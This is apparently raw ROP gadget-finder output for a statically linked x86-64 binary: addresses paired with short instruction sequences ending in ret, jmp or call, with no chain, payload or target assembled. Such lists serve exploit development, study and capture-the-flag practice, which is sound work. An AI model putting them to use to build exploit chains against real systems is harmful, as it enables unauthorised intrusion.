0x0000000000483624 : add byte ptr [rdx + 0x63], cl ; add al, 0xa7 ; add rax, rdi ; jmp rax
0x0000000000419377 : add byte ptr [rdx + rax - 0xd], dh ; ret
0x00000000004bc78b : add byte ptr [rdx + rbp - 3], ah ; jmp rsp
0x00000000004a5cd7 : add byte ptr [rdx + rcx + 0xabf0000], bh ; add byte ptr [rax], al ; ret 0xa
0x000000000045ddc0 : add byte ptr [rdx + rdi*2 - 0xa], dh ; ret
0x000000000045ddbf : add byte ptr [rdx + rdi*2 - 0xa], sil ; ret
0x000000000049b914 : add byte ptr [rdx + rdi*8], cl ; call qword ptr [rax + 0x20fffa0b]
0x000000000049c164 : add byte ptr [rdx - 6], cl ; call qword ptr [rax]
0x00000000004218bf : add byte ptr [rdx], ch ; add byte ptr [rax + 0x39], cl ; ret
0x0000000000424243 : add byte ptr [rsi + 0xb7e], bh ; call 0x400509
0x0000000000433004 : add byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x000000000046a04a : add byte ptr [rsi + 0xf], ah ; outsd dx, dword ptr [rsi] ; ret 0x290f
0x0000000000420e27 : add byte ptr [rsi + 0xf], ah ; outsd dx, dword ptr [rsi] ; ret 0x4466
0x000000000046cdca : add byte ptr [rsi + 0xf], ah ; outsd dx, dword ptr [rsi] ; ret 0x4ce8
0x000000000042085f : add byte ptr [rsi + 0xf], ah ; outsd dx, dword ptr [rsi] ; ret 0x8348
0x000000000046a073 : add byte ptr [rsi + 0xf], ah ; outsd dx, dword ptr [rsi] ; ret 0xa3e8
0x000000000046a011 : add byte ptr [rsi + 0xf], ah ; outsd dx, dword ptr [rsi] ; sbb ah, byte ptr [rsi + 0xf] ; outsd dx, dword ptr [rsi] ; ret
0x0000000000431d94 : add byte ptr [rsi + 0xf], ah ; xlatb ; ret 0xc085
0x0000000000420e26 : add byte ptr [rsi + 0xf], spl ; outsd dx, dword ptr [rsi] ; ret 0x4466
0x00000000004b70af : add byte ptr [rsi + rax*2 + 0x75cc0000], dh ; stc ; call qword ptr [rdx]
0x00000000004b7037 : add byte ptr [rsi + rax*2], bh ; add byte ptr [rax], al ; hlt ; insb byte ptr [rdi], dx ; stc ; call rsp
0x00000000004b33db : add byte ptr [rsi + rax*4], al ; cmc ; call rsp
0x000000000042af11 : add byte ptr [rsi + rax*8 - 0xd], dh ; ret
0x000000000045cb80 : add byte ptr [rsi + rsi*2 - 0xa], dh ; ret
0x000000000045cb7f : add byte ptr [rsi + rsi*2 - 0xa], sil ; ret
0x000000000042aed7 : add byte ptr [rsi - 9], dh ; ret 0
0x00000000004b868f : add byte ptr [rsp + rbx*2 + 0xacc0000], dl ; cli ; call rcx
0x00000000004bc6b7 : add byte ptr [rsp + rbx*4 + 0x28e40000], bh ; std ; jmp qword ptr [rdx]
0x00000000004b7e9f : add byte ptr [rsp + rdx*2 - 0x3e840000], ah ; stc ; jmp qword ptr [rdx]
0x000000000045983c : add byte ptr [rsp + rsi - 0xa], dh ; ret
0x00000000004b923b : add byte ptr [rsp], dh ; cli ; call qword ptr [rdx]
0x000000000044fa25 : add byte ptr es:[rax + 0x39], cl ; ret
0x000000000046178c : add byte ptr es:[rax + rcx - 0xd], dh ; ret
0x0000000000452717 : add byte ptr fs:[rax], al ; add byte ptr [rbp - 0x3dbbf040], al ; ret
0x00000000004b8f35 : add byte ptr gs:[rax], al ; call 0x124b89cb
0x000000000041c0c2 : add ch, al ; pop rax ; ret
0x000000000041c1c9 : add ch, al ; push rcx ; ret 0xffff
0x00000000004b0bbc : add ch, byte ptr [ebp + ebp*2 + 0x5b] ; ret 0x6f9
0x00000000004b0bbd : add ch, byte ptr [rbp + rbp*2 + 0x5b] ; ret 0x6f9
0x00000000004bb755 : add ch, byte ptr [rbp + rcx + 7] ; ret
0x000000000047897a : add ch, byte ptr [rcx] ; rol bl, 1 ; mov eax, 0xffffffff ; ret
0x000000000042981a : add ch, byte ptr [rdi - 1] ; dec dword ptr [rbx + 0x90c2454] ; ret 0xbae9
0x0000000000470173 : add ch, byte ptr [rip - 0x7d000000] ; ret
0x00000000004b431f : add ch, byte ptr [rsi + rcx + 8] ; ret
0x000000000044ec38 : add cl, al ; call 0xffffffff84077550
0x0000000000448fc7 : add cl, byte ptr [r8 - 0x76b7fdbe] ; clc ; ret
0x0000000000470952 : add cl, byte ptr [rax + 0x29] ; ret 0xb8
0x000000000045bdae : add cl, byte ptr [rax + 0x39] ; ret
0x000000000046fea6 : add cl, byte ptr [rax + 0x39] ; ret 0x850f
0x000000000044e924 : add cl, byte ptr [rax + 0x77f8c50f] ; ret
0x0000000000423acb : add cl, byte ptr [rax + 0xf] ; ret 0x8948
0x0000000000423728 : add cl, byte ptr [rax + 0xf] ; ret 0x8d44
0x000000000042b1ac : add cl, byte ptr [rax + 0xf] ; ret 0xc3f3
0x0000000000418164 : add cl, byte ptr [rax + 0xf] ; scasd eax, dword ptr [rdi] ; ret
0x0000000000418083 : add cl, byte ptr [rax + 0xf] ; scasd eax, dword ptr [rdi] ; ret 0x2948
0x000000000045794c : add cl, byte ptr [rax + 1] ; fimul word ptr [rax + 1] ; ret
0x0000000000448fc8 : add cl, byte ptr [rax - 0x76b7fdbe] ; clc ; ret
0x0000000000448f35 : add cl, byte ptr [rax - 0x77] ; clc ; ret
0x000000000048c145 : add cl, byte ptr [rax - 0x77] ; je 0x48c176 ; or byte ptr [rax + 1], cl ; ret
0x0000000000485294 : add cl, byte ptr [rax - 0x77] ; ret 0xc148
0x000000000041ede2 : add cl, byte ptr [rax - 0x7b] ; sal byte ptr [rbp - 0x10], 0xf3 ; ret
0x0000000000447790 : add cl, byte ptr [rax - 0x7d] ; ret 0x4808
0x00000000004477f3 : add cl, byte ptr [rax - 0x7d] ; ret 0xe908
0x000000000048ac1d : add cl, byte ptr [rax - 0x7d] ; ret 0xf01
0x000000000043c142 : add cl, byte ptr [rbx + 0x257890e] ; mov dword ptr [rdi], ecx ; ret
0x0000000000458a7a : add cl, byte ptr [rcx - 0x7d] ; ret
0x000000000044d64b : add cl, byte ptr [rdi] ; xchg eax, edx ; ror byte ptr [rdi], 0x94 ; ret 0xc085
0x000000000049b7e8 : add cl, byte ptr [rdx] ; cli ; call qword ptr [rdx + 0x22fffa09]
0x000000000041a8a7 : add cl, ch ; ret
0x000000000046598a : add cl, ch ; ret 0xfffa
0x000000000045b828 : add cl, ch ; ret 0xfffd
0x0000000000400c62 : add cl, cl ; ret
0x0000000000470c48 : add dh, al ; test eax, ebp ; idiv bh ; jmp qword ptr [rax]
0x0000000000465492 : add dh, al ; test esp, eax ; idiv bh ; jmp qword ptr [rax]
0x00000000004a91d7 : add dh, bh ; xlatb ; add dword ptr [rax], eax ; add byte ptr [rax], al ; add byte ptr [rax], al ; call rdi
0x000000000043c2f3 : add dh, bl ; movq qword ptr [rdi], mm1 ; ret
0x00000000004005c6 : add dh, bl ; ret
0x000000000042af4e : add dh, byte ptr [rax + rcx - 9] ; ret 0
0x00000000004b4851 : add dh, byte ptr [rbx + 0xa] ; ret
0x000000000049bce0 : add dh, byte ptr [rcx] ; cli ; call qword ptr [rdx + 0x22fffa30]
0x0000000000421858 : add dh, dh ; ret
0x0000000000457c7e : add dh, dh ; ret 0x4801
0x000000000042918f : add dh, dh ; ret 0x4804
0x00000000004831a8 : add dh, dh ; ret 0x7403
0x000000000045101f : add dh, dh ; ret 0x7404
0x000000000044b677 : add dh, dh ; ret 0x7501
0x000000000044b684 : add dh, dh ; ret 0x7502
0x000000000044b691 : add dh, dh ; ret 0x7504
0x000000000044b649 : add dh, dh ; ret 0x7510
0x000000000044b656 : add dh, dh ; ret 0x7520
0x000000000042b17c : add dh, dh ; ret 0x7540
0x00000000004294b3 : add dh, dh ; ret 0xf02
0x0000000000460f18 : add dh, dh ; ret 0xf04
0x0000000000421789 : add dh, dh ; ret 0xf08
0x000000000046d831 : add dh, dh ; ret 0xf40
0x000000000046d817 : add dh, dh ; ret 0xf50
0x000000000049b558 : add dh, dl ; stc ; jmp rax
0x000000000049bb29 : add dl, bh ; call rax
0x000000000049baa9 : add dl, bh ; jmp rsp
0x000000000049c25c : add dl, ch ; cli ; call qword ptr [rax]
0x000000000048056d : add dword ptr [r15], r9d ; xchg eax, ebp ; ret 0xc283
0x0000000000476be7 : add dword ptr [r8 - 0x75], r9d ; adc dword ptr [rax + 0x39], ecx ; ret 0x3873
0x0000000000475a05 : add dword ptr [r8 - 0x7d], ecx ; ret 0x8502
0x0000000000456833 : add dword ptr [r8 - 0x7d], r9d ; ret
0x000000000044a751 : add dword ptr [rax + 0x28d4802], ecx ; ret
0x000000000046c42a : add dword ptr [rax + 0x29], ecx ; fimul dword ptr [rax + 0x39] ; ret 0xe57f
0x000000000041d75d : add dword ptr [rax + 0x39], ecx ; ret
0x0000000000486739 : add dword ptr [rax + 0x39], ecx ; ret 0x1272
0x000000000048674b : add dword ptr [rax + 0x39], ecx ; ret 0x674
0x00000000004620df : add dword ptr [rax + 0x39], ecx ; ret 0x8841
0x000000000046b80a : add dword ptr [rax + 0x39], ecx ; ret 0x8c0f
0x0000000000463ad3 : add dword ptr [rax + 0x39], ecx ; ret 0xd774
0x0000000000463a5d : add dword ptr [rax + 0x39], ecx ; ret 0xed75
0x000000000045df30 : add dword ptr [rax + 0x39], r9d ; ret
0x0000000000494b73 : add dword ptr [rax + 0x7900ff7a], eax ; sbb dword ptr [rax - 0x7d], ecx ; ret 0x8001
0x0000000000488ae7 : add dword ptr [rax + 1], ecx ; ror byte ptr [rax - 0x77], 1 ; ret 0xc148
0x000000000041444a : add dword ptr [rax + 1], ecx ; ror byte ptr [rax - 0x77], 1 ; ret 0xe281
0x000000000047fd65 : add dword ptr [rax + 9], ecx ; ret 0x1475
0x000000000042488e : add dword ptr [rax + 9], ecx ; ret 0x8949
0x000000000047fd37 : add dword ptr [rax + 9], ecx ; ret 0xe75
0x0000000000467eab : add dword ptr [rax - 0x4f743], eax ; jmp qword ptr [rax]
0x000000000040958f : add dword ptr [rax - 0x6bf0d006], eax ; ret 0xb60f
0x0000000000429864 : add dword ptr [rax - 0x73], ecx ; clc ; cmovne rax, rcx ; ret
0x0000000000401824 : add dword ptr [rax - 0x73], ecx ; jg 0x401832 ; jne 0x401827 ; ret
0x0000000000476be8 : add dword ptr [rax - 0x75], ecx ; adc dword ptr [rax + 0x39], ecx ; ret 0x3873
0x0000000000448fa1 : add dword ptr [rax - 0x776b7fe], ecx ; ret
0x000000000041fb51 : add dword ptr [rax - 0x77], ecx ; adc eax, 0x2a1cd7 ; ret
0x0000000000448f32 : add dword ptr [rax - 0x77], ecx ; add cl, byte ptr [rax - 0x77] ; clc ; ret
0x0000000000485e83 : add dword ptr [rax - 0x77], ecx ; add eax, 0x23e8a5 ; ret
0x0000000000464d90 : add dword ptr [rax - 0x77], ecx ; push rsi ; sub dh, al ; add byte ptr [rcx - 0x7d], cl ; ret
0x000000000040c8bc : add dword ptr [rax - 0x77], ecx ; ret
0x0000000000456d97 : add dword ptr [rax - 0x77], ecx ; ret 0x2b48
0x000000000041ab26 : add dword ptr [rax - 0x77], ecx ; ret 0x3c75
0x0000000000485e82 : add dword ptr [rax - 0x77], r9d ; add eax, 0x23e8a5 ; ret
0x0000000000415826 : add dword ptr [rax - 0x7d], ecx ; ret
0x00000000004880f3 : add dword ptr [rax - 0x7d], ecx ; ret 0x4118
0x0000000000488473 : add dword ptr [rax - 0x7d], ecx ; ret 0x4418
0x0000000000462549 : add dword ptr [rax - 0x7d], ecx ; ret 0x4801
0x0000000000475a06 : add dword ptr [rax - 0x7d], ecx ; ret 0x8502
0x00000000004095d9 : add dword ptr [rax - 0x7d], ecx ; ret 0x8801
0x0000000000457386 : add dword ptr [rax - 0x7d], ecx ; ret 0x8b01
0x0000000000476057 : add dword ptr [rax - 0x7d], ecx ; ret 0x8b04
0x0000000000414d4b : add dword ptr [rax - 0x7d], ecx ; ret 0xf10
0x00000000004709b9 : add dword ptr [rax - 0x91743], eax ; jmp qword ptr [rax]
0x00000000004654d5 : add dword ptr [rax - 0x93b43], eax ; jmp qword ptr [rax]
0x00000000004506e5 : add dword ptr [rax - 1], edi ; jmp 0x4506b6
0x000000000040c2f0 : add dword ptr [rax - 9], ecx ; ror byte ptr [rax + 1], 1 ; ret
0x0000000000416a64 : add dword ptr [rax], eax ; add bl, dh ; ret
0x000000000042040a : add dword ptr [rax], eax ; add byte ptr [rax + 1], cl ; ret
0x000000000046ed63 : add dword ptr [rax], eax ; add byte ptr [rax - 0x39], cl ; ret 0xffe0
0x000000000045bda8 : add dword ptr [rax], eax ; add byte ptr [rax - 0x73], cl ; add cl, byte ptr [rax + 0x39] ; ret
0x000000000047eb64 : add dword ptr [rax], eax ; add byte ptr [rax - 0x73], cl ; dec dword ptr [rax - 0x7d] ; ret
0x00000000004254cd : add dword ptr [rax], eax ; add byte ptr [rax - 0x73], cl ; push rcx ; adc byte ptr [rax + 0x39], cl ; ret 0x1f77
0x0000000000401688 : add dword ptr [rax], eax ; add byte ptr [rax - 0x76beac8e], al ; ret 0x1b8
0x000000000047c69d : add dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; ret
0x000000000044fef9 : add dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; ret 0x16e9
0x000000000049543a : add dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; ret 0x3948
0x000000000045d016 : add dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; ret 0xb2eb
0x0000000000493985 : add dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; ret 0xc148
0x000000000044da1e : add dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; sal ebx, 1 ; movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x0000000000478559 : add dword ptr [rax], eax ; add byte ptr [rax - 0x7b], cl ; push qword ptr [rbp + rax - 0xa] ; ret 0x7408
0x0000000000425b10 : add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; jmp qword ptr [rax]
0x000000000046f038 : add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret
0x00000000004521dc : add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x000000000045cc72 : add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4804
0x0000000000431a07 : add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x0000000000425165 : add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4c07
0x000000000042ac2e : add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xe901
0x000000000044697f : add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x0000000000431a35 : add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x0000000000455451 : add dword ptr [rax], eax ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x00000000004a91da : add dword ptr [rax], eax ; add byte ptr [rax], al ; add byte ptr [rax], al ; call rdi
0x00000000004a838a : add dword ptr [rax], eax ; add byte ptr [rax], al ; add byte ptr [rax], al ; call rsp
0x00000000004a81b2 : add dword ptr [rax], eax ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00000000004a81aa : add dword ptr [rax], eax ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x1d4
0x00000000004a8942 : add dword ptr [rax], eax ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x1d5
0x0000000000493ae7 : add dword ptr [rax], eax ; add byte ptr [rax], al ; call r14
0x0000000000493a3d : add dword ptr [rax], eax ; add byte ptr [rax], al ; call rax
0x0000000000494859 : add dword ptr [rax], eax ; add byte ptr [rax], al ; ja 0x49486a ; sbb eax, eax ; ret
0x0000000000415528 : add dword ptr [rax], eax ; add byte ptr [rax], al ; jmp 0x4154eb
0x0000000000415cc5 : add dword ptr [rax], eax ; add byte ptr [rax], al ; jmp 0x415c92
0x0000000000463c5d : add dword ptr [rax], eax ; add byte ptr [rax], al ; jmp 0x463c2a
0x0000000000467ac5 : add dword ptr [rax], eax ; add byte ptr [rax], al ; jmp rax
0x0000000000400c5f : add dword ptr [rax], eax ; add byte ptr [rax], al ; leave ; ret
0x000000000048526d : add dword ptr [rax], eax ; add byte ptr [rax], al ; mov eax, edx ; pop rbx ; pop rbp ; ret
0x00000000004940f0 : add dword ptr [rax], eax ; add byte ptr [rax], al ; mov edi, 1 ; call rax
0x000000000048b0d6 : add dword ptr [rax], eax ; add byte ptr [rax], al ; mov qword ptr [rdi], rsi ; ret
0x0000000000475b5d : add dword ptr [rax], eax ; add byte ptr [rax], al ; mov rdi, rbx ; call rax
0x000000000040135a : add dword ptr [rax], eax ; add byte ptr [rax], al ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000048d41e : add dword ptr [rax], eax ; add byte ptr [rax], al ; pop rbx ; pop rbp ; ret
0x0000000000486901 : add dword ptr [rax], eax ; add byte ptr [rax], al ; pop rbx ; ret
0x0000000000400fe9 : add dword ptr [rax], eax ; add byte ptr [rax], al ; ret
0x0000000000419b58 : add dword ptr [rax], eax ; add byte ptr [rbp + 0x31], al ; dec dword ptr [rax + 0x39] ; ret 0x860f
0x00000000004938d6 : add dword ptr [rax], eax ; add byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; ret
0x0000000000454c72 : add dword ptr [rax], eax ; add byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x00000000004107ad : add dword ptr [rax], eax ; add byte ptr [rbx - 0x7bf0fe08], al ; ret
0x0000000000498d6d : add dword ptr [rax], eax ; add byte ptr [rcx - 0x75], cl ; pop rax ; or byte ptr [rbp - 0x77], cl ; ret
0x000000000047eb9a : add dword ptr [rax], eax ; add byte ptr [rcx], dh ; fisttp dword ptr [rax - 0x7d] ; ret
0x000000000044b675 : add dword ptr [rax], eax ; add dh, dh ; ret 0x7501
0x000000000044b682 : add dword ptr [rax], eax ; add dh, dh ; ret 0x7502
0x000000000044b68f : add dword ptr [rax], eax ; add dh, dh ; ret 0x7504
0x000000000044b647 : add dword ptr [rax], eax ; add dh, dh ; ret 0x7510
0x000000000044b654 : add dword ptr [rax], eax ; add dh, dh ; ret 0x7520
0x000000000044b661 : add dword ptr [rax], eax ; add dh, dh ; ret 0x7540
0x0000000000460f16 : add dword ptr [rax], eax ; add dh, dh ; ret 0xf04
0x000000000042b1a8 : add dword ptr [rax], eax ; and ch, 2 ; cmovne rax, rdx ; ret
0x000000000042a36c : add dword ptr [rax], eax ; cmove rax, rdx ; ret
0x000000000042a2d3 : add dword ptr [rax], eax ; cmovne rax, rdx ; ret
0x0000000000400ed7 : add dword ptr [rax], eax ; mov eax, 0 ; leave ; ret
0x00000000004166dc : add dword ptr [rax], eax ; mov eax, ebp ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000040c720 : add dword ptr [rax], eax ; pop rbx ; pop rbp ; pop r12 ; ret
0x00000000004532a1 : add dword ptr [rax], esp ; jmp rdx
0x000000000040196c : add dword ptr [rbp - 0x1f], esi ; mov rax, r11 ; ret
0x0000000000400b4c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000044f899 : add dword ptr [rbp - 0x57c03b0], ecx ; add ecx, dword ptr [rdi] ; xchg eax, esi ; ret 0xc085
0x0000000000465312 : add dword ptr [rbp - 0x7b], eax ; in al, 0xf ; lahf ; ret
0x0000000000401828 : add dword ptr [rbp - 0xc], esi ; ret
0x000000000043c1b2 : add dword ptr [rbx + 0x157890e], ecx ; mov dword ptr [rdi], ecx ; ret
0x0000000000472e25 : add dword ptr [rbx - 0x4f743], eax ; jmp qword ptr [rax]
0x000000000048fc59 : add dword ptr [rbx - 0x77], ecx ; push rsp ; ret 0x4808
0x0000000000413e3e : add dword ptr [rbx - 0x7cb70030], eax ; ret
0x0000000000462fa2 : add dword ptr [rcx + 0x39], ecx ; ret
0x00000000004518b3 : add dword ptr [rcx + 9], ecx ; ret
0x0000000000414a8a : add dword ptr [rcx - 0x73], ecx ; or byte ptr [r8 + 0x39], cl ; ret
0x0000000000448fd1 : add dword ptr [rcx - 0x776b7fe], ecx ; ret
0x00000000004757fe : add dword ptr [rcx - 0x77], eax ; ret 0xe883
0x00000000004605e8 : add dword ptr [rcx - 0x78], eax ; dec dword ptr [rax - 0x7d] ; ret
0x0000000000453095 : add dword ptr [rcx - 0x7d], ecx ; ret
0x000000000046def1 : add dword ptr [rcx - 0x7d], ecx ; ret 0x2504
0x000000000047f4ab : add dword ptr [rcx - 0x7d], ecx ; ret 0xf01
0x000000000044e7b2 : add dword ptr [rdi + 0x15], esi ; jb 0x44e7c0 ; mov byte ptr [rdi], cl ; ret
0x00000000004bb71d : add dword ptr [rdi], 0x48 ; or eax, 0x1370303 ; ret
0x00000000004bb6b5 : add dword ptr [rdi], 0x48 ; or eax, 0x34b0303 ; ret
0x00000000004bb6e9 : add dword ptr [rdi], 0x48 ; or eax, 0x35b0303 ; ret
0x00000000004bb6c6 : add dword ptr [rdi], 0xd ; add eax, dword ptr [rbx] ; or al, byte ptr [rcx] ; ret
0x00000000004bb6fa : add dword ptr [rdi], 0xd ; add eax, dword ptr [rdx] ; cld ; ret
0x00000000004bb72e : add dword ptr [rdi], 0xd ; add eax, dword ptr [rdx] ; movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x00000000004b7dcd : add dword ptr [rdi], 3 ; ret 0xa01
0x000000000045d4f0 : add dword ptr [rdi], ecx ; mov dh, 0x41 ; dec dword ptr [rax - 0x7d] ; ret 0x8801
0x000000000042508b : add dword ptr [rdi], ecx ; ret 0x8948
0x000000000044ef01 : add dword ptr [rdi], ecx ; scasd eax, dword ptr [rdi] ; ret 0xf8e9
0x000000000045ae61 : add dword ptr [rdi], ecx ; xchg byte ptr [rdi], dl ; or eax, 0xea810000 ; ret 0
0x000000000048056e : add dword ptr [rdi], ecx ; xchg eax, ebp ; ret 0xc283
0x000000000044d7ac : add dword ptr [rdx + 2], esi ; mov byte ptr [rdi], cl ; ret
0x000000000043f03d : add dword ptr [rdx + 4], esi ; mov cl, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x000000000048bf4b : add dword ptr [rdx + rax*2], 1 ; ret
0x0000000000453ff9 : add dword ptr [rdx], 0x39d23100 ; ret
0x00000000004ba8ac : add dword ptr [rdx], 0x4a ; ret
0x00000000004bd33c : add dword ptr [rdx], 0x55 ; ret
0x00000000004b67d0 : add dword ptr [rdx], 0x5a ; ret
0x00000000004bd2f8 : add dword ptr [rdx], 0x76 ; ret
0x00000000004216a7 : add dword ptr [rdx], ebp ; add byte ptr [rax + 0x39], cl ; ret
0x000000000042169d : add dword ptr [rdx], ebp ; add byte ptr [rax + 1], cl ; ret
0x000000000041f1c8 : add dword ptr [rip + 0x2a4b85], 1 ; ret
0x00000000004b431b : add dword ptr [rsi + rcx + 0x30], ecx ; add ch, byte ptr [rsi + rcx + 8] ; ret
0x00000000004b2910 : add dword ptr [rsi + rdi*8], 0xfe09d9ff ; jmp rsp
0x0000000000448fb2 : add dword ptr [rsi - 0x77], esp ; add cl, byte ptr [rax - 0x77] ; clc ; ret
0x0000000000490bed : add eax, 0x1489066 ; ret 0xb70f
0x00000000004618d0 : add eax, 0x18c48348 ; ret
0x0000000000400c5d : add eax, 0x1b8 ; add cl, cl ; ret
0x000000000042b2c9 : add eax, 0x1bb12 ; cmove rax, rdx ; ret
0x000000000042a369 : add eax, 0x1d0a2 ; cmove rax, rdx ; ret
0x00000000004500da : add eax, 0x1f0fc3f3 ; add byte ptr [rax - 0x39], cl ; ret 0xffc0
0x00000000004322fa : add eax, 0x20 ; add rax, rdi ; vzeroupper ; ret
0x000000000042ae80 : add eax, 0x221ab ; cmove rax, rdx ; ret
0x000000000042b209 : add eax, 0x22732 ; cmovne rax, rdx ; ret
0x000000000042b0c9 : add eax, 0x22862 ; cmovne rax, rdx ; ret
0x000000000042af69 : add eax, 0x229d2 ; cmovne rax, rdx ; ret
0x000000000042b270 : add eax, 0x22a7b ; cmovne rax, rdx ; ret
0x000000000042b130 : add eax, 0x22bab ; cmovne rax, rdx ; ret
0x000000000042afd0 : add eax, 0x22d1b ; cmovne rax, rdx ; ret
0x00000000004961c1 : add eax, 0x22e1fe ; add dword ptr [rax], eax ; add byte ptr [rax], al ; ret
0x00000000004960b1 : add eax, 0x22e30e ; add dword ptr [rax], eax ; add byte ptr [rax], al ; ret
0x000000000042b24f : add eax, 0x22ecc ; cmovne rax, rdx ; ret
0x000000000042b10f : add eax, 0x22ffc ; cmovne rax, rdx ; ret
0x000000000042afaf : add eax, 0x2316c ; cmovne rax, rdx ; ret
0x000000000042a2f0 : add eax, 0x231db ; cmovne rax, rdx ; ret
0x000000000042b03b : add eax, 0x23660 ; cmovne rax, rdx ; ret
0x000000000048e320 : add eax, 0x2368b2 ; jne 0x48e356 ; ret
0x000000000042b01e : add eax, 0x237dd ; cmovne rax, rdx ; ret
0x000000000048b559 : add eax, 0x238b4a ; ret
0x000000000048b53e : add eax, 0x238b65 ; add rsp, 8 ; ret
0x000000000042b06f : add eax, 0x2390c ; cmovne rax, rdx ; ret
0x0000000000485fec : add eax, 0x23e737 ; mov qword ptr [rsi], rax ; ret
0x0000000000485f7b : add eax, 0x23e7b0 ; ret
0x0000000000485f42 : add eax, 0x23e7e9 ; add rsp, 8 ; ret
0x0000000000485e86 : add eax, 0x23e8a5 ; ret
0x0000000000473587 : add eax, 0x24bc94 ; mov rax, qword ptr [rax + rdi*8] ; jmp rax
0x0000000000473534 : add eax, 0x24bce7 ; mov rax, qword ptr [rax + rdi*8] ; jmp rax
0x0000000000473007 : add eax, 0x24bd14 ; mov rax, qword ptr [rax + rdi*8] ; jmp rax
0x00000000004733a6 : add eax, 0x24be75 ; mov rax, qword ptr [rax + rdi*8] ; jmp rax
0x0000000000473361 : add eax, 0x24beba ; mov rax, qword ptr [rax + rdi*8] ; jmp rax
0x000000000047331c : add eax, 0x24beff ; mov rax, qword ptr [rax + rdi*8] ; jmp rax
0x00000000004732cd : add eax, 0x24bf4e ; mov rax, qword ptr [rax + rdi*8] ; jmp rax
0x0000000000467a20 : add eax, 0x256bfb ; mov rax, qword ptr [rax + rdi*8] ; jmp rax
0x0000000000467dcf : add eax, 0x256d4c ; mov rax, qword ptr [rax + rdi*8] ; jmp rax
0x0000000000467d81 : add eax, 0x256d9a ; mov rax, qword ptr [rax + rdi*8] ; jmp rax
0x0000000000467cd2 : add eax, 0x256e49 ; mov rax, qword ptr [rax + rdi*8] ; jmp rax
0x0000000000467c76 : add eax, 0x256ea5 ; mov rax, qword ptr [rax + rdi*8] ; jmp rax
0x00000000004679d6 : add eax, 0x257145 ; mov rax, qword ptr [rax + rdi*8] ; jmp rax
0x0000000000467988 : add eax, 0x257193 ; mov rax, qword ptr [rax + rdi*8] ; jmp rax
0x0000000000467527 : add eax, 0x2572f4 ; mov rax, qword ptr [rax + rdi*8] ; jmp rax
0x000000000045e632 : add eax, 0x265881 ; ret
0x0000000000453fb2 : add eax, 0x26e349 ; ret
0x00000000004560d2 : add eax, 0x26ebd1 ; ret
0x000000000045958f : add eax, 0x29480000 ; ret 0x349
0x000000000042b1e9 : add eax, 0x298c42 ; add dh, byte ptr [rax + rcx - 9] ; ret 0
0x000000000042b0a9 : add eax, 0x298d82 ; add dh, byte ptr [rax + rcx - 9] ; ret 0
0x000000000042af49 : add eax, 0x298ee2 ; add dh, byte ptr [rax + rcx - 9] ; ret 0
0x00000000004262a7 : add eax, 0x29b5b4 ; ret
0x00000000004262b1 : add eax, 0x29daf6 ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00000000004201cd : add eax, 0x2a168e ; ret
0x000000000041fcc8 : add eax, 0x2a1b23 ; ret
0x000000000041fcdf : add eax, 0x2a1b28 ; ret
0x000000000041fca0 : add eax, 0x2a1b43 ; ret
0x000000000041fc80 : add eax, 0x2a1b5b ; ret
0x000000000041fb76 : add eax, 0x2a1ccd ; ret
0x000000000041fb66 : add eax, 0x2a1cd5 ; ret
0x000000000041fb16 : add eax, 0x2a1cdd ; ret
0x000000000041fb06 : add eax, 0x2a1cf5 ; ret
0x000000000041f132 : add eax, 0x2a1fe9 ; ret
0x0000000000420181 : add eax, 0x2a3c26 ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x000000000041fcf5 : add eax, 0x2a40da ; ret
0x000000000041f22d : add eax, 0x2a4b22 ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00000000004b996c : add eax, 0x3400e4e ; ret
0x000000000048bb2e : add eax, 0x38c48348 ; ret
0x0000000000423a1e : add eax, 0x39480000 ; ret 0xf275
0x000000000043231a : add eax, 0x40 ; add rax, rdi ; vzeroupper ; ret
0x000000000044a7e8 : add eax, 0x48054289 ; lea eax, dword ptr [rdx + 8] ; ret
0x0000000000449018 : add eax, 0x48054289 ; mov eax, edi ; ret
0x000000000044ace6 : add eax, 0x480f8948 ; mov dword ptr [rdi + 5], edx ; ret
0x000000000044a869 : add eax, 0x5428948 ; lea rax, qword ptr [rdx + 0xc] ; ret
0x0000000000449059 : add eax, 0x5428948 ; mov rax, rdi ; ret
0x000000000048bcd0 : add eax, 0x5b ; cmovne rax, rdx ; ret
0x00000000004a9d7d : add eax, 0x5c00000 ; add byte ptr [rax], al ; ret 5
0x000000000047853a : add eax, 0x5c415d5b ; ret
0x000000000043233a : add eax, 0x60 ; add rax, rdi ; vzeroupper ; ret
0x000000000042b299 : add eax, 0x6c52 ; cmove rax, rdx ; ret
0x000000000042aea9 : add eax, 0x6d12 ; cmove rax, rdx ; ret
0x000000000042af0d : add eax, 0x79ee ; je 0x42aee2 ; ret
